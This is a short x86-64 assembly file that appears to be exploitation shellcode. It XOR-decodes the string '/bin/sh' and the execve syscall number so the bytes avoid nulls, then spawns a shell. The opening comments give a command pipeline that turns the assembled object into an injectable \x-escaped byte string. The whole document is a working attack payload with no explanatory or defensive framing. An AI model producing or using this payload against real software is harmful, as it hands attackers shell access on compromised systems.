; nasm -f elf64 shell_code.asm
; objdump -d shell_code.o | grep -Po '\s\K[a-f0-9]{2}(?=\s)' | sed 's/^/\\x/g' | perl -pe 's/\r?\n//' | sed 's/$/\n/'

section .text
    global _start

_start:

    mov rdi, 0xff978cd091969dd0
    xor rdi, 0xffffffffffffffff ; An xor operation on rdi to reach /bin/sh string

    push rdi
    mov rdi, rsp            ; rdi now points to "/bin/sh" on the stack
    push rax                ; Push null terminator onto the stack

    mov rsi, rax            ; Set rsi to NULL (argv)
    mov rdx, rax            ; Set rdx to NULL (envp)

    mov rax, 0x3a
    xor rax, 0x1            ; An xor operation on rax to reach 0x3b which is syscall number for execve
    syscall